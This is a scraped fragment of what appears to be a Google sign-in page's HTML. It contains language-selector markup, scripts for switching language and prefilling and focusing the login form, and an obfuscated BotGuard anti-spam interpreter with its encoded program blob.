  ‪ລາວ‬
  </option>
  <option value="km">
  ‪ខ្មែរ‬
  </option>
  <option value="ko">
  ‪한국어‬
  </option>
  <option value="zh-HK">
  ‪中文（香港）‬
  </option>
  <option value="ja">
  ‪日本語‬
  </option>
  <option value="zh-CN">
  ‪简体中文‬
  </option>
  <option value="zh-TW">
  ‪繁體中文‬
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var appendHiddenParams = function(query) {
          var loginForm = document.getElementById('gaia_loginform');
          if (loginForm) {
            var loginInputs = loginForm.getElementsByTagName('input');
            for (var i = 0, input; input = loginInputs[i]; i++) {
              if (input.type == 'hidden' && input.value && !query[input.name]) {
                query[input.name] = input.value;
              }
            }
          }
        }
        var post = function(path, params) {
          var form = document.createElement('form');
          form.setAttribute('method', 'post');
          form.setAttribute('action', path);
          for (var key in params) {
            if (params.hasOwnProperty(key)) {
              var hiddenField = document.createElement('input');
              hiddenField.setAttribute('type', 'hidden');
              hiddenField.setAttribute('name', key);
              hiddenField.setAttribute('value', params[key]);
              form.appendChild(hiddenField);
            }
          }
          document.body.appendChild(form);
          form.submit();
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];
        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var hiddenEmailInput = document.getElementById('Email-hidden');
            if (hiddenEmailInput) {
              // If we are in password separation on password page, post to
              // /AccountLoginInfo.
              appendHiddenParams(langChooser_params);
              langChooser_params['Email'] = hiddenEmailInput.value;
              post('/AccountLoginInfo', langChooser_params);
            } else {
              var paramsStr = langChooser_getParamStr(langChooser_params);
              var newHref = langChooser_currentPath + "?" + paramsStr;
              if (langChooser_fragment) {
                newHref = newHref + "#" + langChooser_fragment;
              }
              window.location.href = newHref;
            }
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29tCg== */(function(){eval('var f=void 0,g,h=this,m=function(a,b){var c=a.split("."),d=h;!(c[0]in d)&&d.execScript&&d.execScript("var "+c[0]);for(var e;c.length&&(e=c.shift());)!c.length&&b!==f?d[e]=b:d=d[e]?d[e]:d[e]={}},n=function(a){var b=typeof a;if("object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;var c=Object.prototype.toString.call(a);if("[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},q=Date.now||function(){return+new Date};new function(){q()};var r=function(a){for(var b=(a=a.replace(/\\r\\n/g,"\\n"),[]),c=0,d=0;d<a.length;d++){var e=a.charCodeAt(d);128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128)}return b};var y=function(a){try{if(this.c=[],s(this,this.b,0),s(this,this.l,0),s(this,this.o,0),s(this,this.h,[]),s(this,this.f,[]),s(this,this.G,"object"==typeof window?window:h),s(this,this.H,this),s(this,this.p,0),s(this,this.D,0),s(this,this.F,0),s(this,this.i,u(4)),s(this,this.n,[]),s(this,this.k,{}),this.C=true,a&&"!"==a[0])this.d=a;else{var b;if(window.atob){var c=window.atob(a);for(var d=(a=[],0),e=0;e<c.length;e++){for(var k=c.charCodeAt(e);255<k;)a[d++]=k&255,k>>=8;a[d++]=k}b=a}else b=null;this.e=b,!this.e||!this.e.length?this.g(this.P):(this.I=[],this.q())}}catch(l){v(this,l)}},v=(g=y.prototype,g.K=[function(){},function(a){var b=z(a),c=z(a),d=a.a(b),b=A(a,b),e=A(a,c);e==a.j||e==a.m?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),s(a,c,d)},function(a){var b=z(a),c=A(a,b);if(0<c){for(var d=0;c--;)d=d<<8|z(a);s(a,b,d)}else if(c!=a.t){if(d=z(a)<<8|z(a),c==a.j)if(c="",a.c[a.u]!=f)for(var e=a.a(a.u);d--;)var k=e[z(a)<<8|z(a)],c=c+k;else{for(c=Array(d),e=0;e<d;e++)c[e]=z(a);for(d=c,c=[],k=e=0;e<d.length;){var l=d[e++];if(128>l)c[k++]=String.fromCharCode(l);else if(191<l&&224>l){var p=d[e++];c[k++]=String.fromCharCode((l&31)<<6|p&63)}else{var p=d[e++],t=d[e++];c[k++]=String.fromCharCode((l&15)<<12|(p&63)<<6|t&63)}}c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=z(a);s(a,b,c)}},function(a){z(a)},function(a){var b=z(a),c=z(a),d=z(a),c=a.a(c),b=a.a(b);s(a,d,b[c])},function(a){var b=z(a),c=z(a),b=a.a(b);s(a,c,n(b))},function(a){var b=z(a),c=z(a),d=A(a,b),e=A(a,c);d==a.j&&e==a.j?(a.c[c]==f&&s(a,c,""),s(a,c,a.a(c)+a.a(b))):e==a.m&&(0>d?(b=a.a(b),d==a.j&&(b=r(""+b)),(c==a.f||c==a.i||c==a.n)&&B(a,c,C(b.length,2)),B(a,c,b)):0<d&&B(a,c,C(a.a(b),d)))},function(a){var b=z(a),c=z(a);s(a,c,function(a){return eval(a)}(a.a(b)))},function(a){var b=z(a),c=z(a);s(a,c,a.a(c)-a.a(b))},function(a){var b=D(a);s(a,b.M,b.L.apply(b.self,b.A))},function(a){var b=z(a),c=z(a);s(a,c,a.a(c)%a.a(b))},function(a){var b=z(a),c=a.a(z(a)),d=a.a(z(a)),e=a.a(z(a));a.a(b).addEventListener(c,E(a,d,e,true),false)},function(a){var b=z(a),c=z(a),d=z(a);a.a(b)[a.a(c)]=a.a(d)},function(){},function(a){var b=z(a),c=z(a);s(a,c,a.a(c)+a.a(b))},function(a){var b=z(a),c=z(a);0!=a.a(b)&&s(a,a.b,a.a(c))},function(a){var b=z(a),c=z(a),d=z(a);a.a(b)==a.a(c)&&s(a,d,a.a(d)+1)},function(a){var b=z(a),c=z(a),d=z(a);a.a(b)>a.a(c)&&s(a,d,a.a(d)+1)},function(a){var b=z(a),c=z(a),d=z(a);s(a,d,a.a(b)<<c)},function(a){var b=z(a),c=z(a),d=z(a);s(a,d,a.a(b)|a.a(c))},function(a){var b=a.a(z(a));F(a,b)},function(a){var b=a.I.pop();if(b){for(var c=z(a);0<c;c--){var d=z(a);b[d]=a.c[d]}a.c=b}else s(a,a.b,a.e.length)},function(a){var b=z(a),c=z(a),d=z(a);s(a,d,(a.a(b)in a.a(c))+0)},function(a){var b=z(a),c=a.a(z(a)),d=a.a(z(a));s(a,b,E(a,c,d))},function(a){var b=z(a),c=z(a);s(a,c,a.a(c)*a.a(b))},function(a){var b=z(a),c=z(a),d=z(a);s(a,d,a.a(b)>>c)},function(a){var b=z(a),c=z(a),d=z(a);s(a,d,a.a(b)||a.a(c))},function(a){var b=D(a),c=b.A,d=b.self,e=b.L;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.g(a.v);return}s(a,b.M,c)},function(a){var b=z(a),c=z(a),d=z(a),e=z(a),b=a.a(b),c=a.a(c),d=a.a(d);if(a=a.a(e),"object"==n(b)){var e=[],k;for(k in b)e.push(k);b=e}for(k=b.length,e=0;e<k;e+=d)c(b.slice(e,e+d),a)}],g.b=0,g.o=1,g.h=2,g.l=3,g.f=4,g.u=5,g.N=6,g.J=8,g.G=9,g.H=10,g.p=11,g.D=12,g.F=13,g.i=14,g.n=15,g.k=16,g.$=17,g.R=15,g.Y=12,g.S=10,g.T=42,g.aa=6,g.j=-1,g.m=-2,g.t=-3,g.P=17,g.U=21,g.v=22,g.ba=30,g.W=31,g.V=33,g.s={},g.B="caller",g.ca=0,function(a,b){a.d=("E:"+b.message+":"+b.stack).substring(0,2048)}),u=function(a){for(var b=Array(a);a--;)b[a]=255*Math.random()|0;return b},G=function(a,b,c){try{for(var d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},H=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},C=function(a,b){for(var c=[],d=b-1;0<=d;d--)c[b-1-d]=a>>8*d&255;return c},B=function(a,b,c,d){if(b!=a.h){var e=a.a(b);for(var k=(b=b==a.i?function(b){try{var c=e.length,d=c&7;if(4==d){var k=[0,0,0,a.a(a.F)];e.Z=G(H(e,c-8),H(e,c-4),k)}e.push(e.Z[d]^b)}catch(w){throw w;}}:function(a){e.push(a)},d&&b(d&255),d=c.length,0);k<d;k++)b(c[k])}},I=function(a,b){var c=function(){for(var a=d[e.B],w=a===b,a=a&&a[e.B],x=0;a&&a!=k&&a!=l&&a!=p&&a!=t&&20>x;)x++,a=a[e.B];return c[!w+!a+(x>>2)]},d=function(){return c()},e=y.prototype,k=e.q,l=e.O,p=y,t=e.g;return c[e.ca]=a,a=f,d},J=function(a){var b=function(){return c()},c=function(){return a};return b.Q=function(b){a=b},b},s=function(a,b,c){if(b==a.b||b==a.l)a.c[b]?a.c[b].Q(c):a.c[b]=J(c);else{if((b==a.f||b==a.i||b==a.h)&&a.c[b])return;a.c[b]=I(c,a.a)}b==a.o&&(a.r=f,s(a,a.b,a.a(a.b)+4))},z=(y.prototype.a=function(a){var b=this.c[a];if(b===f)throw this.g(this.ba,0,a),this.s;return b()},y.prototype.g=function(a,b,c){var d=this.a(this.l);a=[a,d>>8&255,d&255],c!=f&&a.push(c),0==this.a(this.h).length&&(this.c[this.h]=f,s(this,this.h,a)),b&&(c="",b.message&&(c=b.message.toString()),b.stack!=f&&(c+=": "+b.stack),c=c.substring(0,2048),c=r(c),B(this,this.i,C(c.length,2).concat(c),this.Y))},function(a){var b=a.a(a.b);if(!(b in a.e))throw a.g(a.W),a.s;if(a.r==f&&(a.r=H(a.e,b-4),a.w=f),a.w!=b>>3){var c=(a.w=b>>3,[0,0,0,a.a(a.o)]);a.X=G(a.r,a.w,c)}return s(a,a.b,b+1),a.e[b]^a.X[b%8]}),A=function(a,b){return b<=a.$?b==a.h||b==a.f||b==a.i||b==a.n?a.m:b==a.N||b==a.G||b==a.H||b==a.k?a.t:b==a.u?a.j:4:[1,2,4,a.m,a.t,a.j][b%a.aa]},D=(y.prototype.ga=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},y.prototype.fa=function(a,b,c){var d=a[(b+2)%3];a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)},y.prototype.ea=function(a,b){if(3==a.length){for(var c=0;3>c;c++)b[c]+=a[c];for(var d=[13,8,13,12,16,5,3,10,15],c=0;9>c;c++)b[3](b,c%3,d[c])}},function(a){var b={},c=(b.L=a.a(z(a)),b.M=z(a),z(a)-1),d=z(a);for(b.self=a.a(d),b.A=[];c--;)d=z(a),b.A.push(a.a(d));return b}),E=function(a,b,c,d){return function(){if(!d||a.C)return s(a,a.N,arguments),s(a,a.k,c),K(a,b)}},F=function(a,b){a.I.push(a.c.slice()),a.c[a.b]=f,s(a,a.b,b)},K=function(a,b){var c=a.a(a.b),d=(a.e&&c<a.e.length?(s(a,a.b,a.e.length),F(a,b)):s(a,a.b,b),a.q());return s(a,a.b,c),d};y.prototype.q=function(){try{for(var a=this.e.length,b=2001,c=null,d=0;--b&&(d=this.a(this.b))<a;)try{var e=(s(this,this.l,d),z(this)%this.K.length);(c=this.K[e])?c(this):this.g(this.U,0,e)}catch(k){if(k!=this.s){var l=this.a(this.p);l?(s(this,l,k),s(this,this.p,0)):this.g(this.v,k)}}b||this.g(this.V)}catch(p){try{this.g(this.v,p)}catch(t){v(this,t)}}return this.a(this.k)},y.prototype.O=function(){if(this.d)return this.d;try{var a=(this.C=false,this.c[this.J]&&K(this,this.a(this.J)),this.a(this.h)),b=(0<a.length&&B(this,this.f,C(a.length,2).concat(a),this.R),this.a(this.D)&255),b=b-(this.a(this.f).length+4),c=this.a(this.i),d=(4<c.length&&(b-=c.length+3),0<b&&B(this,this.f,C(b,2).concat(u(b)),this.S),4<c.length&&B(this,this.f,C(c.length,2).concat(c),this.T),[3].concat(this.a(this.f))),e,k;if(window.btoa?(k=window.btoa(String.fromCharCode.apply(null,d)),e=k=k.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")):e=null,this.d=e)this.d="!"+this.d;else for(this.d="",a=0;a<d.length;a++){var l=d[a].toString(16);1==l.length&&(l="0"+l),this.d+=l}}catch(p){v(this,p)}return this.d},y.prototype.da=function(a){a(this.O())};try{window.addEventListener("unload",function(){},false)}catch(L){}m("botguard.bg",y),m("botguard.bg.prototype.invoke",y.prototype.da);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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');
  </script>
<script type="text/javascript">
  var gaia_hasInnerTextProperty =
  document.getElementsByTagName("body")[0].innerText != undefined ? true : false;
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
  var gaia_getElementsByClass = function(className) {
  if (document.getElementsByClassName) {
  return document.getElementsByClassName(className);
  } else if (document.querySelectorAll && document.querySelectorAll('.' + className)) {
  return document.querySelectorAll('.' + className);
  }
  return [];
  };
</script>
<script type="text/javascript">
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var f = null;
    if (document.getElementById) {
      f = document.getElementById('gaia_loginform');
    }

    if (f && f.Email && (f.Email.value == null || f.Email.value == '')
        && (f.Email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        f.Email.value = hashParams['Email'];
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }


  
  function gaia_setFocus() {
    
    var f = null;
    if (document.getElementById) {
      f = document.getElementById('gaia_loginform');
    }
    if (f) {
      var agt = navigator.userAgent.toLowerCase();
      var is_ie = (agt.indexOf("msie") != -1);
      if (f.Email && (f.Email.value == null || f.Email.value == '' || is_ie)
          && (f.Email.type != 'hidden') && f.Email.focus) {
        f.Email.focus();
        if (f.Email.value) {
           
          f.Email.value = f.Email.value;
        }
      } else if (f.Passwd) {
        f.Passwd.focus();
      }
    }
    
  }
  window.onload = gaia_setFocus;

